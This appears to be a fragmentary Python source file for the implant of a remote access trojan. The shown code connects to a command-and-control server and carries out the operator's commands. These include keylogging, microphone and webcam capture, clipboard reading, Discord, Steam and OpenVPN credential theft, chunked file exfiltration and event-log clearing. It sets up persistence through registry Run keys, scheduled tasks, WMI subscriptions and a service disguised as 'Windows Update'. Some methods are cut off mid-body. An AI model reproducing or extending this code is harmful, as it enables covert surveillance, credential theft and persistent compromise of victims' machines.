                        $event | Remove-WinEvent -ErrorAction SilentlyContinue
                    }}
                    Write-Output "SUCCESS|$count"
                }}
                catch {{
                    Write-Output "ERROR|$($_.Exception.Message)"
                }}
                '''
                
                result = subprocess.run(

                    capture_output=True, text=True, timeout=120,
                    encoding='utf-8', errors='replace',
                    startupinfo=startupinfo, creationflags=creationflags
                )
                
                output = result.stdout.strip()

                        "agent_id": self.agent_id
                    })
                else:
                    error = output.replace("ERROR|", "") if output.startswith("ERROR|") else "Unknown error"

                        "type": "event_log_clear_result",
                        "log_name": log_name,
                        "success": False,
                        "msg": f"Failed: {error}",
                        "agent_id": self.agent_id
                    })
            
        except Exception as e:
            await self.send_message({
                "type": "event_log_clear_result",
                "log_name": log_name,
                "success": False,
                "msg": f"Error: {str(e)}",
                "agent_id": self.agent_id
            })

    async def start_keylogger_with_timer(self, duration_seconds):
        if not KEYLOGGER_ENABLED:
            await self.send_message({
                "type": "keylog_timer_result",
                "success": False,
                "msg": "Keylogger module disabled in this build",
                "agent_id": self.agent_id
            })
            return
        if not HAS_PYNPUT:
            await self.send_message({
                "type": "keylog_timer_result",
                "success": False,
                "msg": "pynput not installed. Run: pip install pynput",
                "agent_id": self.agent_id
            })
            return
        
        global keylogger_running, keylogger_queue, keylogger_main_loop
        

        if keylogger_running:
            await self.stop_keylogger({})
            await asyncio.sleep(0.5)
        

        log_buffer = []
        timestamp_start = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        

        def on_press(key):
            global keylogger_queue, keylogger_main_loop, keylogger_running
            if not keylogger_running or keylogger_queue is None:
                return
            
            try:
                key_str = str(key)
                

                special_ignore = ['Key.enter', 'Key.shift', 'Key.shift_r', 'Key.ctrl_l', 'Key.ctrl_r',
                                  'Key.alt_l', 'Key.alt_r', 'Key.cmd', 'Key.cmd_r', 'Key.tab']
                
                if key_str in special_ignore:
                    return
                
                if 'enter' in key_str.lower():
                    return
                
                if key_str == 'Key.space':
                    log_buffer.append(' ')
                    return
                
                if key_str == 'Key.backspace':
                    log_buffer.append('[BACKSPACE]')
                    return
                
                special_map = {
                    'Key.delete': '[DEL]', 'Key.esc': '[ESC]', 'Key.up': '[UP]', 'Key.down': '[DOWN]',
                    'Key.left': '[LEFT]', 'Key.right': '[RIGHT]', 'Key.home': '[HOME]', 'Key.end': '[END]',
                    'Key.page_up': '[PGUP]', 'Key.page_down': '[PGDN]',
                }
                
                if key_str in special_map:
                    log_buffer.append(special_map[key_str])
                    return
                
                if 'f' in key_str and len(key_str) <= 6 and key_str[1:].isdigit():
                    log_buffer.append(f'[F{key_str[1:]}]')
                    return
                

                vk_code = get_vk_code_from_key(key)
                
                if vk_code is not None:
                    caps = is_capslock_on()
                    shift = is_shift_pressed()
                    char = get_real_char(vk_code, shift, caps)
                    if char:
                        log_buffer.append(char)
                        return
                

                if hasattr(key, 'char') and key.char and len(key.char) == 1:
                    char = key.char
                    caps = is_capslock_on()
                    shift = is_shift_pressed()
                    if caps and char.isalpha():
                        if shift:
                            char = char.lower()
                        else:
                            char = char.upper()
                    log_buffer.append(char)
                    
            except Exception as e:
                pass
        

        keylogger_queue = asyncio.Queue()
        keylogger_main_loop = asyncio.get_running_loop()
        keylogger_running = True
        
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        

        await asyncio.sleep(duration_seconds)
        

        keylogger_running = False
        listener.stop()
        listener.join()
        

        log_content = ''.join(log_buffer)
        if not log_content:

    async def start_microphone_recording(self, duration_seconds, device_index=None):

        if not MIC_ENABLED or not AUDIO_ENABLED:
            await self.send_message({
                "type": "mic_recording_result",
                "success": False,
                "msg": "Microphone recording module disabled in this build",
                "agent_id": self.agent_id
            })
            return
        if not HAS_PYAUDIO:
            await self.send_message({
                "type": "mic_recording_result",
                "success": False,
                "msg": "PyAudio not installed",
                "agent_id": self.agent_id
            })
            return
        
        try:
            import wave
            
            FORMAT = pyaudio.paInt16
            CHANNELS = 1
            RATE = 44100
            CHUNK = 1024
            
            if device_index is None:
                device_index = self.audio.get_default_input_device_info()['index']
            
            stream = self.audio.open(
                format=FORMAT,
                channels=CHANNELS,
                rate=RATE,
                input=True,
                input_device_index=device_index,
                frames_per_buffer=CHUNK
            )
            
            frames = []
            start_time = time.time()
            
            while time.time() - start_time < duration_seconds:
                data = stream.read(CHUNK, exception_on_overflow=False)
                frames.append(data)
            
            stream.stop_stream()
            stream.close()
            
            hostname = socket.gethostname()
            filename = f"mic_{hostname}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
            
            wf = wave.open(filename, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(self.audio.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()
            
            with open(filename, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode()
            
            await self.send_message({
                "type": "mic_recording_result",
                "success": True,
                "filename": filename,
                "data": file_data,
                "hostname": hostname,
                "duration": duration_seconds,
                "agent_id": self.agent_id
            })
            

            if os.path.exists(filename):
                os.remove(filename)
            
        except Exception as e:
            await self.send_message({
                "type": "mic_recording_result",
                "success": False,
                "msg": str(e),
                "agent_id": self.agent_id
            })

    async def send_task_details(self, task_name):

            await self.send_message({
                "type": "task_details",
                "error": "This feature works only on Windows",
                "agent_id": self.agent_id
            })
            return

        try:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            creationflags = subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0


            cmd = f'schtasks /query /tn "{task_name}" /fo list /v'

            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=15,
                encoding='cp866',      
                errors='replace',
                startupinfo=startupinfo,
                creationflags=creationflags
            )

            if result.returncode != 0:
                error_msg = result.stderr.strip() or result.stdout.strip() or "Unknown error"
                await self.send_message({
                    "type": "task_details",
                    "error": f"Failed to query task: {error_msg}",
                    "task_name": task_name,
                    "agent_id": self.agent_id
                })
                return


            details = {}
            current_key = None
            for line in result.stdout.splitlines():
                line = line.strip()
                if not line:
                    continue
                if ':' in line:
                    key, value = line.split(':', 1)
                    key = key.strip()
                    value = value.strip()
                    details[key] = value
                    current_key = key
                elif current_key and line:

                    details[current_key] += " " + line.strip()


            await self.send_message({
                "type": "task_details",
                "data": details,
                "task_name": task_name,
                "agent_id": self.agent_id,
                "raw_output": result.stdout[:5000]  
            })

        except subprocess.TimeoutExpired:
            await self.send_message({
                "type": "task_details",
                "error": "Command timed out",
                "task_name": task_name,
                "agent_id": self.agent_id
            })
        except Exception as e:
            await self.send_message({
                "type": "task_details",
                "error": str(e),
                "task_name": task_name,
                "agent_id": self.agent_id
            })

                if ($state -eq "Running") { $status = "running" }

                elseif ($state -eq "PausePending") { $status = "pause_pending" }
                elseif ($state -eq "Paused") { $status = "paused" }
                else { $status = "unknown" }
                

                if ($startMode -eq "Auto") { $start_type = "auto" }
                elseif ($startMode -eq "Manual") { $start_type = "manual" }
                elseif ($startMode -eq "Disabled") { $start_type = "disabled" }
                elseif ($startMode -eq "Boot") { $start_type = "boot" }
                elseif ($startMode -eq "System") { $start_type = "system" }

    async def clipboard_read(self):

        try:

            ps_cmd = '''
            [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
            Add-Type -AssemblyName System.Windows.Forms
            $text = [System.Windows.Forms.Clipboard]::GetText()
            if ($text) {
                $bytes = [System.Text.Encoding]::UTF8.GetBytes($text)
                [System.Console]::OpenStandardOutput().Write($bytes, 0, $bytes.Length)
            }
            '''
            
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            creationflags = subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
            
            result = subprocess.run(
                ['powershell', '-NoProfile', '-Command', ps_cmd],
                capture_output=True, timeout=5,
                startupinfo=startupinfo, creationflags=creationflags
            )
            

            content = result.stdout.decode('utf-8', errors='replace').strip()
            
            if not content:
                content = "[Empty clipboard]"
                
            await self.send_message({"type": "clipboard_result", "data": content})
            
        except subprocess.TimeoutExpired:
            await self.send_message({"type": "clipboard_result", "data": "[Timeout]"})
        except Exception as e:
            await self.send_message({"type": "clipboard_result", "data": f"[Error: {str(e)}]"})

    async def _auto_setup(self):
        """Автонастройка агента: копирование и персист."""
        try:
            # 1. Копирование
            target_path = self.get_target_path()
            if target_path and target_path != sys.executable:
                self.log(f"[AutoSetup] Copying agent to {target_path}...")
                await asyncio.to_thread(self.ensure_copy_exists)
                self.log("[AutoSetup] Copy completed")
            
            # 2. Авто-персист
            if AUTO_PERSIST:
                self.log(f"[AutoSetup] Applying auto-persist method: {AUTO_PERSIST}")
                
                if AUTO_PERSIST == "registry":
                    await self.persist_add("WindowsUpdate")
                elif AUTO_PERSIST == "schtask":
                    await self.persist_schtask_add("WindowsUpdateTask", "minutes", 30, None, None, False)
                elif AUTO_PERSIST == "startup":
                    await self.persist_startup_folder_add("WindowsUpdate")
                elif AUTO_PERSIST == "wmi":

                elif AUTO_PERSIST == "service":

                    self.log(f"[AutoSetup] Unknown persist method: {AUTO_PERSIST}")
        except Exception as e:
            self.log(f"[AutoSetup] Error: {e}")

    async def connect(self):
        while self.running:
            try:
                self.log("Connecting to server...")
                

                protocol = "wss" if self.use_ssl else "ws"
                uri = f"{protocol}://{self.server_ip}:{self.server_port}"
                

                if self.use_ssl:
                    import ssl
                    ssl_context = ssl.create_default_context()
                    ssl_context.check_hostname = False
                    ssl_context.verify_mode = ssl.CERT_NONE
                    self.ws = await websockets.connect(
                        uri,
                        max_size=524288000,
                        ssl=ssl_context
                    )
                else:
                    self.ws = await websockets.connect(
                        uri,
                        max_size=524288000
                    )

                
                self.log("Connected")

                if USE_SECURE_MODE:

                    self.secure_session = SecureSession()

                    await self.ws.send(json.dumps({"type": "auth_request"}))
                    response = await self.ws.recv()
                    data = json.loads(response)
                    if data.get("type") != "auth_challenge":
                        raise Exception("Unexpected response")
                    
                    nonce = data.get("nonce")
                    signature = hmac.new(
                        self.auth_token.encode('utf-8'),
                        nonce.encode('utf-8'),
                        hashlib.sha256
                    ).hexdigest()

                    await self.ws.send(json.dumps({
                        "type": "auth_response",
                        "nonce": nonce,
                        "signature": signature,
                        "username": self.agent_id,
                        "client_type": "agent"
                    }))

                    response = await self.ws.recv()
                    data = json.loads(response)
                    if data.get("type") != "auth_success":
                        raise Exception("Authentication failed")


                    await self.ws.send(json.dumps({
                        "type": "key_exchange",
                        "public_key": self.secure_session.get_public_key_b64()
                    }))
                    response = await self.ws.recv()
                    data = json.loads(response)
                    if data.get("type") == "key_exchange_response":
                        self.secure_session.set_peer_public_key(data.get("public_key"))
                        self.cipher = self.secure_session.cipher
                        self.use_encryption = True


                    await self.register()
                else:

                    await self.register()
                

                # ===== АВТОНАСТРОЙКА (КОПИРОВАНИЕ + ПЕРСИСТ) =====
                target_path = self.get_target_path()
                if AUTO_PERSIST or (target_path and target_path != sys.executable):
                    self.log("[AutoSetup] Starting auto-configuration...")
                    asyncio.create_task(self._auto_setup())

                self.log("Starting receive task...")
                receive_task = asyncio.create_task(self.receive())

                await self._receive_ready.wait()
                self.log("Receive is ready, waiting for messages...")

                if AUTO_GRABBER:
                    self.log("Auto-Grabber enabled, starting collection...")
                    asyncio.create_task(self.auto_grabber())

                await receive_task

            except websockets.ConnectionClosed:
                if not self.running:
                    break
                self.log("Connection lost, reconnecting in 5 seconds...")
                await asyncio.sleep(5)
                continue
            except Exception as e:
                if not self.running:
                    break
                self.log(f"Connection error: {e}, retrying in 10 seconds...")
                await asyncio.sleep(10)
                continue
            finally:
                if not self.running:
                    break

                if self.ws:
                    try:
                        await self.ws.close()
                    except:
                        pass
                self.log("Reconnecting...")
                await asyncio.sleep(5)

    async def send_file_chunks_json(self, file_path, original_filename, msg_type="download"):
        try:
            chunk_size = 4 * 1024 * 1024  
            file_size = os.path.getsize(file_path)
            total_chunks = (file_size + chunk_size - 1) // chunk_size
            agent_id = self.agent_id


            for chunk_index in range(total_chunks):

                def read_chunk():
                    with open(file_path, "rb") as f:
                        f.seek(chunk_index * chunk_size)
                        return f.read(chunk_size)
                
                chunk_data = await asyncio.to_thread(read_chunk)
                encoded_chunk = base64.b64encode(chunk_data).decode()

                await self.send_message({
                    "type": f"{msg_type}_chunk",
                    "filename": original_filename,
                    "chunk": chunk_index,
                    "total_chunks": total_chunks,
                    "data": encoded_chunk,
                    "file_size": file_size,
                    "agent_id": agent_id
                })

                if chunk_index % 10 == 0:
                    progress = int((chunk_index + 1) * 100 / total_chunks)
                    await self.send_message({
                        "type": f"{msg_type}_progress",
                        "filename": original_filename,
                        "progress": progress,
                        "chunk": chunk_index + 1,
                        "total": total_chunks,
                        "agent_id": agent_id
                    })


            await self.send_message({
                "type": f"{msg_type}_complete",
                "filename": original_filename,
                "size": file_size,
                "total_chunks": total_chunks,
                "agent_id": agent_id
            })

        except Exception as e:
            await self.send_message({
                "type": f"{msg_type}_error",
                "filename": original_filename,
                "error": str(e),
                "agent_id": self.agent_id
            })

    async def register(self):
        geo_data = await asyncio.to_thread(self.get_geolocation)
        
        os_version = f"{platform.system()} {platform.release()}"
        
        if sys.platform == 'win32':
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                    r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
                
                product_name = winreg.QueryValueEx(key, "ProductName")[0]
                current_build = winreg.QueryValueEx(key, "CurrentBuildNumber")[0]
                
                build = int(current_build) if current_build.isdigit() else 0
                
                if build >= 22000:
                    if "Windows 10" in product_name:
                        product_name = product_name.replace("Windows 10", "Windows 11")
                    elif "Windows" in product_name and "11" not in product_name:
                        product_name = "Windows 11" + product_name.split("Windows")[-1]
                
                os_version = product_name.strip()
                
                winreg.CloseKey(key)
            except:
                pass
                
        antivirus = self.detect_antivirus()
        
        info = {
            "id": self.agent_id,
            "type": "agent",
            "name": socket.gethostname(),
            "ip": socket.gethostbyname(socket.gethostname()),
            "os": os_version,
            "user": os.getlogin() if hasattr(os, 'getlogin') else 'unknown',
            "arch": platform.machine(),
            "is_admin": self.check_admin(),
            "geo": geo_data,
            "antivirus": antivirus,
            "disabled_modules": DISABLED_MODULES
        }
        

        if not USE_SECURE_MODE:

            info["token"] = "AUTH_TOKEN"

        
        await self.send_message(info)

        try:
            import mss
            with mss.mss() as sct:
                monitor = sct.monitors[1]
                screen_w = monitor['width']
                screen_h = monitor['height']
                await self.send_message({
                    "type": "screen_resolution",
                    "width": screen_w,
                    "height": screen_h
                })
        except Exception as e:
            print(f"Could not get screen resolution: {e}")

    async def send_message(self, data_dict):
        msg = json.dumps(data_dict)
        if self.use_encryption and self.cipher:
            msg = self.cipher.encrypt(msg)
        await self.ws.send(msg)

    async def receive(self):
        try:

            self._receive_ready.set() 
            async for msg in self.ws:
                if not self.running:
                    break
                try:
                    if self.use_encryption and self.cipher:
                        try:
                            decrypted = self.cipher.decrypt(msg)
                            data = json.loads(decrypted)
                            print(f"[DEBUG] Decrypted message: {data.get('type')}")
                        except Exception as e:
                            print(f"[DEBUG] Decryption failed: {e}, falling back to plain JSON")
                            try:
                                data = json.loads(msg)
                            except:
                                print(f"[DEBUG] Failed to parse as JSON: {msg[:100]}")
                                continue
                    else:
                        try:
                            data = json.loads(msg)
                        except:
                            print(f"[DEBUG] Failed to parse message: {msg[:100]}")
                            continue
                    
                    cmd = data.get("command")
                    params = data.get("params", {})
                    msg_type = data.get("type")
                    
                    print(f"[Agent] Received command: {cmd}")  
                    
                    if cmd == "ping":
                        await self.send_message({"type": "pong"})
                    elif cmd == "resume_transfer":
                        await self.handle_resume_request(params)
                    elif cmd == "screenshot":
                        monitor = params.get("monitor", 1)
                        await self.screenshot(monitor)
                    elif cmd == "mouse_move":
                        x = params.get("x")
                        y = params.get("y")
                        if x is not None and y is not None:
                            await asyncio.to_thread(self.move_mouse, x, y)
                    elif cmd == "mouse_click":
                        button = params.get("button", "left")
                        double = params.get("double", False)
                        await asyncio.to_thread(self.click_mouse, button, double)
                    elif cmd == "get_discord_tokens":
                        asyncio.create_task(self.get_discord_tokens())
                    elif cmd == "keyboard_text":
                        text = params.get("text", "")
                        if text:
                            await asyncio.to_thread(self.send_keys, text)
                    elif cmd == "keyboard_key":
                        key_name = params.get("key", "")
                        key_down = params.get("key_down", True)
                        if key_name:
                            await self._send_key(key_name, key_down)
                    elif cmd == "openvpn_creds":
                        await self.get_openvpn_credentials()
                    elif cmd == "run_powershell_script":
                        script_b64 = params.get("script", "")
                        await self.run_powershell_script(script_b64)
                    elif cmd == "start_stream":
                        monitor = params.get("monitor", 1)
                        asyncio.create_task(self.start_stream(monitor))
                    elif msg_type == "hbd_data":
                        self.log(f"[HBD] Received hbd_data! Size: {len(data.get('data', '')) if data.get('data') else 0} bytes")
                        if hasattr(self, '_hbd_future') and self._hbd_future and not self._hbd_future.done():
                            hbd_data = data.get("data")
                            self._hbd_future.set_result(hbd_data)
                            self.log("[HBD] Future set successfully")
                        else:
                            self.log("[HBD] No active future — ignoring")
                        continue
                    elif cmd == "mouse_down":
                        button = params.get("button", "left")
                        await asyncio.to_thread(self.mouse_down, button)
                    elif cmd == "mouse_up":
                        button = params.get("button", "left")
                        await asyncio.to_thread(self.mouse_up, button)
                    elif cmd == "start_all_monitors":
                        if not hasattr(self, 'all_monitors_streaming') or not self.all_monitors_streaming:
                            if self.streaming:
                                self.streaming = False
                                await asyncio.sleep(0.5)
                            asyncio.create_task(self.start_all_monitors_stream())
                    elif cmd == "stop_stream":
                        self.streaming = False
                        if hasattr(self, 'all_monitors_streaming'):
                            self.all_monitors_streaming = False
                    elif cmd == "fun_taskmanager":
                        await self.fun_taskmanager(params.get("action"))
                    elif cmd == "persist_schtask_add":
                        await self.persist_schtask_add(
                            params.get("task_name", "WindowsUpdateTask"),
                            params.get("trigger_type", "minutes"),
                            params.get("interval_minutes"),
                            params.get("interval_hours"),
                            params.get("interval_days"),
                            params.get("run_as_system", False)
                        )
                    elif cmd == "persist_schtask_remove":
                        await self.persist_schtask_remove(params.get("task_name", "WindowsUpdateTask"))
                    elif cmd == "persist_startup_folder_add":
                        await self.persist_startup_folder_add(params.get("link_name", "WindowsUpdate"))
                    elif cmd == "persist_startup_folder_remove":
                        await self.persist_startup_folder_remove(params.get("link_name", "WindowsUpdate"))
                    elif cmd == "get_steam_tokens":
                        asyncio.create_task(self.get_steam_tokens_external())

    async def persist_add(self, key_name):
        if sys.platform != 'win32':
            await self.send_message({"type": "error", "msg": "Persistence works only on Windows"})
            return
        try:
            exe_path = self.get_target_path()  
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            await self.send_message({"type": "result", "msg": f"[+] Added to Autorun: '{key_name}' -> '{exe_path}'"})
        except Exception as e:
            await self.send_message({"type": "error", "msg": f"Autorun Add Error: {e}"})

    async def persist_remove(self, key_name):
        if sys.platform != 'win32':
            return
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, key_name)
            winreg.CloseKey(key)
            await self.send_message({"type": "result", "msg": f"[+] Removed '{key_name}' from Autorun."})
        except FileNotFoundError:
            await self.send_message({"type": "result", "msg": f"[-] Key '{key_name}' not found in Autorun."})
        except Exception as e:
            await self.send_message({"type": "error", "msg": f"Autorun Remove Error: {e}"})



    async def persist_schtask_add(self, task_name, trigger_type, interval_minutes=None, interval_hours=None, interval_days=None, run_as_system=True):

        if sys.platform != 'win32':
            await self.send_message({"type": "error", "msg": "Task Scheduler works only on Windows"})
            return
        
        try:
            exe_path = self.get_target_path()
            

            if trigger_type == "minutes" and interval_minutes:
                schtasks_trigger = f"/sc minute /mo {interval_minutes}"
                interval_display = f"every {interval_minutes} minute(s)"
            elif trigger_type == "hours" and interval_hours:
                schtasks_trigger = f"/sc hourly /mo {interval_hours}"
                interval_display = f"every {interval_hours} hour(s)"
            elif trigger_type == "days" and interval_days:
                schtasks_trigger = f"/sc daily /mo {interval_days}"
                interval_display = f"every {interval_days} day(s)"
            else:
                schtasks_trigger = "/sc minute /mo 30"
                interval_display = "every 30 minute(s)"
            

            remove_cmd = f'schtasks /delete /tn "{task_name}" /f'
            subprocess.run(remove_cmd, shell=True, capture_output=True, timeout=10)
            


            if run_as_system:
                run_as = '/ru "SYSTEM"'
                level_text = "SYSTEM"
            else:

                run_as = ''
                level_text = "Current User"
            
            cmd = f'schtasks /create /tn "{task_name}" /tr "{exe_path}" {schtasks_trigger} {run_as} /f'
            
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            creationflags = subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
            
            result = subprocess.run(
                cmd,
                shell=True, capture_output=True, text=True, timeout=30,
                startupinfo=startupinfo, creationflags=creationflags
            )
            

            if result.returncode == 0:

                if trigger_type == "minutes" and interval_minutes:
                    mod_cmd = f'schtasks /change /tn "{task_name}" /ri {interval_minutes}'
                    subprocess.run(mod_cmd, shell=True, capture_output=True, timeout=10,
                                  startupinfo=startupinfo, creationflags=creationflags)
                
                await self.send_message({
                    "type": "result", 
                    "msg": f"[+] Scheduled task '{task_name}' created ({interval_display}) running as {level_text}"
                })
            else:
                error_msg = result.stderr.strip() if result.stderr else result.stdout.strip()

                if "Access is denied" in error_msg and run_as_system:
                    await self.send_message({
                        "type": "error", 
                        "msg": f"Access denied! Cannot create SYSTEM task without Administrator privileges.\nTry using 'Current User Task' option."
                    })
                else:
                    await self.send_message({
                        "type": "error", 
                        "msg": f"Task creation failed: {error_msg}"
                    })
                
        except Exception as e:
            await self.send_message({"type": "error", "msg": f"Schtask error: {str(e)}"})

    async def persist_wmi_add(self, event_name, interval_minutes=30):

        if sys.platform != 'win32':
            await self.send_message({"type": "error", "msg": "WMI works only on Windows"})
            return
        
        try:
            exe_path = self.get_target_path()
            

            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            creationflags = subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
            

            ps_cmd = f'''
            $filterName = "{event_name}_Filter"
            $consumerName = "{event_name}_Consumer"
            

            $query = "SELECT * FROM __InstanceModificationEvent WITHIN {interval_minutes} WHERE TargetInstance ISA 'Win32_ComputerSystem'"
            $filterArgs = @{{Name=$filterName; QueryLanguage="WQL"; Query=$query}}
            $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $filterArgs
            

            $consumerArgs = @{{Name=$consumerName; CommandLineTemplate="{exe_path}"; ExecutablePath="{exe_path}"}}
            $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $consumerArgs
            

            $bindingArgs = @{{Filter=$filter; Consumer=$consumer}}
            $binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments $bindingArgs
            '''
            
            result = subprocess.run(
                ['powershell', '-Command', ps_cmd],
                capture_output=True, text=True, timeout=30,
                startupinfo=startupinfo, creationflags=creationflags
            )
            
            if result.returncode == 0:
                await self.send_message({"type": "result", "msg": f"[+] WMI subscription '{event_name}' created (every {interval_minutes} min)"})
            else:
                error_msg = result.stderr[:200] if result.stderr else "Unknown error"
                await self.send_message({"type": "error", "msg": f"WMI creation failed: {error_msg}"})
        except Exception as e:
            await self.send_message({"type": "error", "msg": f"WMI error: {str(e)}"})

    async def persist_wmi_remove(self, event_name):

            $bindings | ForEach-Object {{$_.Delete()}}
            

            $consumers = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object {{$_.Name -eq $consumerName}}
            $consumers | ForEach-Object {{$_.Delete()}}
            

            $filters = Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object {{$_.Name -eq $filterName}}

    async def persist_service_add(self, service_name):

        try:

            ps_cmd = f'''
            $serviceName = "{service_name}"
            $binPath = "{exe_path}"
            $displayName = "Windows Update Service"
            $description = "Manages Windows updates and background services"
            

            $existing = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
            if ($existing) {{
                Stop-Service -Name $serviceName -Force
                sc.exe delete $serviceName
                Start-Sleep -Seconds 2
            }}
            

            New-Service -Name $serviceName -BinaryPathName $binPath -DisplayName $displayName -Description $description -StartupType Automatic
            

            sc.exe failure $serviceName reset=86400 actions=restart/60000/restart/60000/restart/60000
            

            Start-Service -Name $serviceName -ErrorAction SilentlyContinue
            '''
            
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            creationflags = subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
            
            result = subprocess.run(
                ['powershell', '-Command', ps_cmd],
                capture_output=True, text=True, timeout=30,
                startupinfo=startupinfo, creationflags=creationflags
            )
            
            if result.returncode == 0 or "already exists" in result.stderr.lower():
                await self.send_message({"type": "result", "msg": f"[+] Service '{service_name}' installed and started"})
            else:
                await self.send_message({"type": "error", "msg": f"Service creation failed: {result.stderr[:200]}"})
        except Exception as e:
            await self.send_message({"type": "error", "msg": f"Service error: {e}"})

    async def start_keylogger(self, params):
        if not KEYLOGGER_ENABLED:
            await self.send_message({"type": "error", "msg": "Keylogger module disabled in this build"})
            return
        global keylogger_running, keylogger_queue, keylogger_main_loop, keylogger_listener, HAS_PYNPUT
        if not HAS_PYNPUT:
            await self.send_message({"type": "error", "msg": "pynput not installed. Run: pip install pynput"})
            return
        

        if keylogger_running:
            await self.stop_keylogger(params)
            await asyncio.sleep(0.5)  
        
        keylogger_queue = asyncio.Queue()
        keylogger_main_loop = asyncio.get_running_loop()
        

        def start_hook():
            global keylogger_listener, keylogger_running
            if keylogger_listener and keylogger_listener.is_alive():
                try:
                    keylogger_listener.stop()
                except:
                    pass
            keylogger_listener = keyboard.Listener(on_press=on_press)
            keylogger_listener.start()
            keylogger_running = True
            return True
        
        success = await asyncio.to_thread(start_hook)
        
        if success:
            self.keylogger_task = asyncio.create_task(self._send_keylog_loop())
            await self.send_message({"type": "result", "msg": "[+] Keylogger started"})
        else:
            await self.send_message({"type": "error", "msg": "Failed to start keylogger"})

        if not KEYLOGGER_ENABLED:
            await self.send_message({"type": "error", "msg": "Keylogger module disabled in this build"})
            return
        global keylogger_running, keylogger_queue, keylogger_listener
        if not keylogger_running:
            await self.send_message({"type": "result", "msg": "Keylogger not running"})
            return
        

        def stop_hook():
            global keylogger_listener, keylogger_running
            keylogger_running = False
            if keylogger_listener and keylogger_listener.is_alive():
                try:
                    keylogger_listener.stop()
                except:
                    pass
            keylogger_listener = None
        
        await asyncio.to_thread(stop_hook)
        

        if hasattr(self, 'keylogger_task') and self.keylogger_task:
            self.keylogger_task.cancel()
            try:
                await self.keylogger_task
            except asyncio.CancelledError:
                pass
            self.keylogger_task = None
        

        if keylogger_queue:
            while not keylogger_queue.empty():
                try:
                    keylogger_queue.get_nowait()
                except:
                    break
            keylogger_queue = None
        
        await self.send_message({"type": "result", "msg": "[+] Keylogger stopped"})

        if not WEBCAM_ENABLED:
            return
        backend = cv2.CAP_DSHOW if sys.platform == 'win32' else cv2.CAP_ANY
        cap = cv2.VideoCapture(index, backend)
        
        if cap.isOpened():
            cap.set(cv2.CAP_PROP_FOURCC, cv2.VideoWriter_fourcc(*'MJPG'))
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
            
            while self.webcam_active and self.running:
                try:
                    ret, frame = cap.read()
                    if ret and frame is not None:
                        _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
                        self.latest_webcam_frame = base64.b64encode(buffer).decode()
                    time.sleep(0.04) 
                except:
                    break
        if cap: cap.release()

    async def start_mic(self, index, rate):
        if not MIC_ENABLED:
            await self.send_message({"type": "error", "msg": "Microphone module disabled in this build"})
            return
        if self.mic_active:
            return
        self.mic_active = True

        try:

            protocol = "wss" if self.use_ssl else "ws"
            uri = f"{protocol}://{self.server_ip}:{self.server_port}"
            

            kwargs = {"max_size": 524288000}
            if self.use_ssl:
                import ssl
                ssl_context = ssl.create_default_context()
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
                kwargs["ssl"] = ssl_context
            
            self.mic_ws = await websockets.connect(uri, **kwargs)
            reg_msg = {"type": "data_channel", "id": f"{self.agent_id}_audio", "token": "AUTH_TOKEN"}
            await self.mic_ws.send(json.dumps(reg_msg))
        except Exception as e:
            await self.send_message({"type": "error", "msg": f"Failed to open audio channel: {e}"})
            self.mic_active = False
            return

        chunk = 4096

        agent_id_bytes = self.agent_id.encode('utf-8')[:36].ljust(36, b'\x00')
        magic = b'AUDI'  

        try:
            self.mic_stream = self.audio.open(
                format=pyaudio.paInt16,
                channels=1,
                rate=rate,
                input=True,
                input_device_index=index,
                frames_per_buffer=chunk
            )
            while self.mic_active and self.running:
                data = await asyncio.to_thread(self.mic_stream.read, chunk, False)

                await self.mic_ws.send(magic + agent_id_bytes + data)
        except Exception as e:
            await self.send_message({"type": "error", "msg": f"Mic Error: {e}"})
        finally:
            if self.mic_stream:
                self.mic_stream.stop_stream()
                self.mic_stream.close()
            if self.mic_ws:
                await self.mic_ws.close()
                self.mic_ws = None

